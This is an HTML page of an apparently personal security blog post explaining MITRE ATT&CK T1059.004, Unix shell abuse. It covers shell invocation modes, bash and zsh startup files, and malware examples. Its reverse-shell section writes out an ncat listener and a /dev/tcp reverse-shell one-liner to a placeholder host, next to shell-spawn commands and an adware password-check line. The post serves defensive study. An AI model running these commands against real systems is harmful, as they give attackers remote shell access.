@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Command and Scripting Interpreter: Unix Shell (T1059.004) ::
+        Axelarator Blog — A simple theme for Hugo
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Command and Scripting Interpreter: Unix Shell #  T1059.004
+Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.
+Invocation #  Interactive Shell #  An interactive shell is one started without non-option arguments and without the -c option whose standard input and error are both connected to terminals (as determined by isatty), or one started with the -i option."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://axelarator.github.io/posts/unixshell/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://axelarator.github.io/assets/style.css" />
+
+<link rel="stylesheet" href="https://axelarator.github.io/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="https://axelarator.github.io/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="https://axelarator.github.io/img/favicon.png" />
+
+
+<link href="https://axelarator.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://axelarator.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://axelarator.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://axelarator.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://axelarator.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://axelarator.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Command and Scripting Interpreter: Unix Shell (T1059.004)"/>
+<meta name="twitter:description" content="Command and Scripting Interpreter: Unix Shell #  T1059.004
+Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.
+Invocation #  Interactive Shell #  An interactive shell is one started without non-option arguments and without the -c option whose standard input and error are both connected to terminals (as determined by isatty), or one started with the -i option."/>
+
+
+
+<meta property="og:title" content="Command and Scripting Interpreter: Unix Shell (T1059.004)" />
+<meta property="og:description" content="Command and Scripting Interpreter: Unix Shell #  T1059.004
+Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.
+Invocation #  Interactive Shell #  An interactive shell is one started without non-option arguments and without the -c option whose standard input and error are both connected to terminals (as determined by isatty), or one started with the -i option." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://axelarator.github.io/posts/unixshell/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-06-23T20:17:09-04:00" />
+<meta property="article:modified_time" content="2022-06-23T20:17:09-04:00" /><meta property="og:site_name" content="Axelarator Blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Axelarator</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Command and Scripting Interpreter: Unix Shell (T1059.004)</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-06-23
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="command-and-scripting-interpreter-unix-shell">
+  Command and Scripting Interpreter: Unix Shell
+  <a href="#command-and-scripting-interpreter-unix-shell" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p><a href="https://www.notion.so/T1564-004-7d6a2ff19f994283b4238ecb5eb99bcd">T1059.004</a></p>
+<p><em>Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with <a href="https://attack.mitre.org/techniques/T1021/004">SSH</a>. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.</em></p>
+<h1 id="invocation">
+  Invocation
+  <a href="#invocation" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<h3 id="interactive-shell">
+  Interactive Shell
+  <a href="#interactive-shell" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>An <em><strong>interactive</strong></em> shell is one started without non-option arguments and without the <strong>-c</strong> option whose standard input and error are both connected to terminals (as determined by <strong><a href="https://linux.die.net/man/3/isatty">isatty</a>)</strong>, or one started with the <strong><code>-i</code></strong> option. <strong>PS1</strong> is set and <strong>$-</strong> includes <strong><code>i</code></strong> if <strong>bash</strong> is interactive, allowing a shell script or a startup file to test this state. An interactive shell will execute both <code>/etc/profile</code> and <code>/etc/bash.bashrc</code>.</p>
+<p>To spawn an interactive shell:</p>
+<p><code>python -c 'import pty: pty.spawn(&quot;/bin/sh&quot;)'</code></p>
+<p><code>echo os.system('/bin/bash')</code></p>
+<p><code>/bin/sh -i</code></p>
+<p>An *interactive <strong>login</strong> shell *****is when bash is spawned by login in a TTY, SSH daemon, or similar means like using <code>-l</code> or <code>--login</code>.</p>
+<p>An <em>interactive <strong>non-login</strong> shell</em> does not source <code>~/.bash_profile</code>. For example, if you login to bash using PuTTY, you enter an <em>interactive <em><em>login shell</em>.</em></em> Then, if you type <code>bash</code> after, you switch to an <em>interactive <strong>non-login</strong></em> shell.</p>
+<h3 id="non-interactive-shell">
+  Non-Interactive Shell
+  <a href="#non-interactive-shell" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>A <em>non-interactive</em> shell is used when a user cannot interact with the shell like executing a bash script. Within a non-interactive shell, only <code>/etc/bash.bashrc</code> is executed.</p>
+<h3 id="options">
+  Options
+  <a href="#options" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-c</td>
+<td>Commands are read from string and if arguments are after the string, they are assigned positional parameters, starting with $0.</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>The shell becomes interactive.</td>
+</tr>
+<tr>
+<td>-l</td>
+<td>Invokes bash as a login shell.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="reverse-shell">
+  Reverse Shell
+  <a href="#reverse-shell" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>A reverse shell is a shell session established on a connection initiated from a remote machine. RCE vulnerabilities can be exploited to use a reverse shell to obtain an interactive shell session on the target machine. If a host is directly accessible, an attacker can create a bind shell between an attacker controlled machine and a remote network host. If the remote host isn’t directly accessible due to a firewall or NAT, a reverse shell would be used. The target initiates an outgoing connection to a listening network host to establish a shell session.</p>
+<p>An attacker could create a netcat listener on a specified port.</p>
+<ul>
+<li><code>ncat -l -p 1111</code></li>
+</ul>
+<p>With remote code execution ability on the victim machine, the attacker would execute a shell command to connect back to the listener.</p>
+<ul>
+<li><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/port 0&gt;&amp;1</code></li>
+</ul>
+<p>List of reverse shells: <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<h1 id="zsh">
+  Zsh
+  <a href="#zsh" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>Zsh is derived from the Bourne family of shells. It can be used as an interactive login shell and interpreter for shell scripting, but serves as an extension to the standard Bourne shell (bash) with improvements and additional features. Oh-My-Zsh is a popular Zsh framework for managing configurations. Zsh ignores the bash configuration files (<code>.bash_profile</code> or <code>.bashrc</code>).</p>
+<p>For persistence, Zsh is important as it is has been the default shell on macOS since 10.15 Catalina.</p>
+<p>For compatibility, existing <code>bash</code> scripts can be moved to <code>zsh</code> by setting the shebang in the script to <code>#!/bin/zsh</code>. Additional features with <code>zsh</code> include arrays and associative arrays which are like dictionaries.</p>
+<h1 id="configuration-files">
+  Configuration Files
+  <a href="#configuration-files" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<h3 id="bash">
+  Bash
+  <a href="#bash" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p><strong>/etc/profile</strong></p>
+<p>Sets system wide environment variables on user shells from <code>/etc/profile.d/*.sh</code> and <code>/etc/bash.bashrc</code>. Executed only for <strong>interactive</strong> <strong>login</strong> shells or <strong>non-interactive</strong> shells with the <code>--login</code> option. This is the system wide version of <code>.bash_profile</code>. Both <code>.profile</code> and <code>.bash_profile</code> set environment variables such as <code>umask</code> or <code>PATH</code> for users.</p>
+<p><strong>~/.bash_profile</strong></p>
+<p>Used in <strong>interactive login</strong> shells and operates on a per-user basis after <code>/etc/profile</code>. If <code>/etc/profile</code> isn’t found, <code>~/.bash_login</code> and <code>~/.profile</code> are checked in order.</p>
+<p><strong>/etc/profile.d</strong></p>
+<p><code>/etc/profile</code> will execute scripts within <code>/etc/profile.d/*.sh</code>. Configurations within a shell script to set system wide environment variables should be placed within <code>/etc/profile.d</code>.</p>
+<p><strong>/etc/bashrc</strong></p>
+<p>This file sets command aliases and functions used by individual bash shell users. <code>/etc/bashrc</code> and <code>/etc/bash.bashrc</code> is the system wide version of <code>.bashrc</code>. This file is executed for both <strong>interactive</strong> and <strong>non-interactive</strong> shells, not <strong>login</strong> shells. In Ubuntu, <code>/etc/profile</code> calls <code>/etc/bashrc</code> directly.</p>
+<p><strong>~/.bash_logout</strong></p>
+<p>Used in <strong>interactive login</strong> shells after exit of a login shell.</p>
+<h3 id="zsh-1">
+  Zsh
+  <a href="#zsh-1" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Global config files are located within the <code>/etc/</code> folder and user-specific files are within <code>~/.z*</code>.</p>
+<p>Zsh will always start with <code>/etc/zshenv</code>, then the user specific <code>.zshenv</code>.</p>
+<p><strong>Conditions:</strong></p>
+<p>For login shells, zsh will then run <code>/etc/zprofile</code> and <code>.zprofile</code>.</p>
+<p>For interactive <strong>and</strong> login shells, <code>/etc/zshrc</code> and <code>.zshrc</code>. All configurations should be placed here, or <code>.zlogin</code> for user-specific <strong>login</strong> shells.</p>
+<p>For just login shells, <code>/etc/zlogin</code> and <code>.zlogin</code>.</p>
+<p>When a login shell exits, <code>.zlogout</code> is read first, then <code>/etc/zlogin</code>.</p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>File</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/etc/zshenv</td>
+<td>.zshenv</td>
+<td>Supports login shell, interactive shell, scripts, and Terminal.app</td>
+</tr>
+<tr>
+<td>/etc/zprofile</td>
+<td>.zprofile</td>
+<td>Supports login shell and Terminal.app</td>
+</tr>
+<tr>
+<td>/etc/zshrc</td>
+<td>.zshrc</td>
+<td>Supports login shell, interactive shell, and Terminal.app</td>
+</tr>
+<tr>
+<td>/etc/zlogin</td>
+<td>.zlogin</td>
+<td>Supports login shell and Terminal.app</td>
+</tr>
+<tr>
+<td>/etc/zlogout</td>
+<td>.zlogout</td>
+<td>Supports login shell and Terminal.app</td>
+</tr>
+</tbody>
+</table>
+<h1 id="examples">
+  Examples
+  <a href="#examples" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p><a href="https://mackeeper.com/blog/macos-bundlore-adware-analysis/">MacOS Bundlore</a> (Adware) verifies if a password is valid</p>
+<ul>
+<li><code>bin/sh -c echo $'password' | sudo -S echo __tbt_true 2&gt;&amp;1</code></li>
+</ul>
+<p><a href="https://medium.com/stage-2-security/anchor-dns-malware-family-goes-cross-platform-d807ba13ca30">Anchor</a> drops payloads to <code>/tmp/&lt;random_15_chars&gt;</code>and executes via <code>sh</code>.</p>
+<p><a href="https://www.gosecure.net/blog/2018/02/14/chaos-a-stolen-backdoor-rising/">Chaos</a> provides a reverse shell connection on 8338/TCP, encrypted via AES.</p>
+<h1 id="references">
+  References
+  <a href="#references" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<ul>
+<li><a href="https://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/">https://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/</a></li>
+<li><a href="https://wiki.archlinux.org/title/Bash#Invocation">https://wiki.archlinux.org/title/Bash#Invocation</a></li>
+<li><a href="https://linux.die.net/man/1/bash">https://linux.die.net/man/1/bash</a></li>
+<li><a href="https://tldp.org/LDP/abs/html/intandnonint.html">https://tldp.org/LDP/abs/html/intandnonint.html</a></li>
+<li><a href="https://mackeeper.com/blog/macos-bundlore-adware-analysis/">https://mackeeper.com/blog/macos-bundlore-adware-analysis/</a></li>
+<li><a href="https://medium.com/stage-2-security/anchor-dns-malware-family-goes-cross-platform-d807ba13ca30">https://medium.com/stage-2-security/anchor-dns-malware-family-goes-cross-platform-d807ba13ca30</a></li>
+<li><a href="https://www.netsparker.com/blog/web-security/understanding-reverse-shells/">https://www.netsparker.com/blog/web-security/understanding-reverse-shells/</a></li>
+<li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
+<li><a href="https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/">https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/</a></li>
+</ul>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://axelarator.github.io/posts/modification/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Event Triggered Execution: Unix Shell Configuration Modification (T1546.004)</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://axelarator.github.io/posts/ntfs/">
+                  <span class="button__text">Hide Artifacts: NTFS File Attributes (T1564.004)</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Axelarator</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span
+          >© 2022 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
+        >
+        <span
+          >Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span
+        >
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://axelarator.github.io/assets/main.js"></script>
+<script src="https://axelarator.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
